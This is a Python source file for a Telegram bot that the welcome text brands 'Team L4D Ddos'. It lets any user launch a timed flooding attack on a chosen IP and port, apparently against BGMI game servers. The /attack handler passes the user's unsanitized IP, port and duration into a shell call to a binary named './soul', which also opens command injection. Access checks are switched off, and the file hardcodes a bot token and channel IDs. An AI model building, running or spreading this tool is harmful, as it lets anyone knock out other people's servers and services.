import os
import telebot
import json
import logging
import time
from datetime import datetime, timedelta
import random
from threading import Thread
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.new_event_loop()

TOKEN = "7722715217:AAEaDInqxwIBg7DGMOQb77gudQHbfrsqqgw"
FORWARD_CHANNEL_ID = -1002220400423  # Your forward channel ID
CHANNEL_ID = -1002220400423  # Your channel ID
error_channel_id = -1002220400423  # Your error channel ID

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

bot.attack_in_progress = False
bot.attack_duration = 0
bot.attack_start_time = 0

KEYS_FILE = "keys.txt"
USERS_FILE = "users.txt"

# Modified Access Control (No approval needed)
def has_access(user_id):
    return True  # Sabhi ko access dena

# Load and save users and keys as per your current logic (no changes required here)
# ...

# Command handler for handling attacks
@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        # Skip the access check as all users are allowed
        # if not has_access(user_id):
        #     bot.send_message(chat_id, "*🚫 Access Denied!*", parse_mode='Markdown')
        #     return

        # Check if attack is in progress
        if bot.attack_in_progress:
            bot.send_message(chat_id, "⚠️ Please wait! The bot is busy with another attack.", parse_mode='Markdown')
            return

        # Ask for attack parameters (IP, port, duration)
        bot.send_message(chat_id, "*💣 Ready to launch an attack?*\n"
                                   "*Provide the target IP, port, and duration in seconds.*\n"
                                   "*Example: 167.67.25 6296 60* 🔥", parse_mode='Markdown')

        # Wait for the user's next message with the attack details
        bot.register_next_step_handler(message, process_attack_command)

    except Exception as e:
        logging.error(f"Error in attack command: {e}")

# Process the attack command details (IP, port, duration)
def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*❗ Error!*\n"
                                               "*Please use the correct format.*", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        # Ensure the port is not blocked
        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*🔒 Port {target_port} is blocked.*", parse_mode='Markdown')
            return

        # Ensure the duration is not too long
        if duration >= 600:
            bot.send_message(message.chat.id, "*⏳ Maximum duration is 599 seconds.*", parse_mode='Markdown')
            return

        # Start attack
        bot.attack_in_progress = True
        bot.attack_duration = duration
        bot.attack_start_time = time.time()

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)

        bot.send_message(message.chat.id, f"*🚀 Attack Launched!*\n"
                                           f"*Target Host: {target_ip}*\n"
                                           f"*Target Port: {target_port}*\n"
                                           f"*Duration: {duration} seconds!*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

# Run attack asynchronously
async def run_attack_command_async(target_ip, target_port, duration):
    attack_process = asyncio.create_subprocess_shell(
        f"./soul {target_ip} {target_port} {duration} 900"
    )
    pkill_process = asyncio.create_subprocess_shell("pkill screen")

    await asyncio.gather(
        attack_process, pkill_process
    )

    bot.attack_in_progress = False

# Command handler for the "/when" command to check remaining time on the attack
@bot.message_handler(commands=['when'])
def when_command(message):
    chat_id = message.chat.id
    if bot.attack_in_progress:
        elapsed_time = time.time() - bot.attack_start_time
        remaining_time = bot.attack_duration - elapsed_time

        if remaining_time > 0:
            bot.send_message(chat_id, f"*⏳ Time Remaining: {int(remaining_time)} seconds...*", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "*🎉 The attack has successfully completed!*", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*❌ No attack is currently in progress!*", parse_mode='Markdown')

# Command handler for starting the bot (you can customize this as needed)
@bot.message_handler(commands=['start'])
def handle_start(message):
    user_id = message.from_user.id
    username = message.from_user.username if message.from_user.username else "Not set"
    first_name = message.from_user.first_name if message.from_user.first_name else "Not set"
    last_name = message.from_user.last_name if message.from_user.last_name else ""
    
    full_name = f"{first_name} {last_name}".strip()

    if has_access(user_id):
        status = "Approve"
    else:
        status = "NonApprove"

    profile_photos = bot.get_user_profile_photos(user_id)
    if profile_photos.total_count > 0:
        profile_photo = profile_photos.photos[0][-1].file_id
    else:
        profile_photo = None
    
    welcome_message = f"""
    Welcome To Team L4D Ddos 
    Join @samy784
    
    Your Information Here:
    Name: {full_name}
    Username: @{username}
    ID Number: {user_id}
    Status: {status}
    /attack This will Attack On bgmi After use attack command add Ip Port Time
    /when To See Left Time
    /g_key To Create Key
    /reedom To Approve Him Self By key
    /delete_key To Remove User
    """
    
    if profile_photo:
        bot.send_photo(message.chat.id, profile_photo, caption=welcome_message)
    else:
        bot.reply_to(message, welcome_message)

# Start bot and handle commands
def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()

if __name__ == '__main__':
    Thread(target=start_asyncio_thread).start()
    bot.infinity_polling()
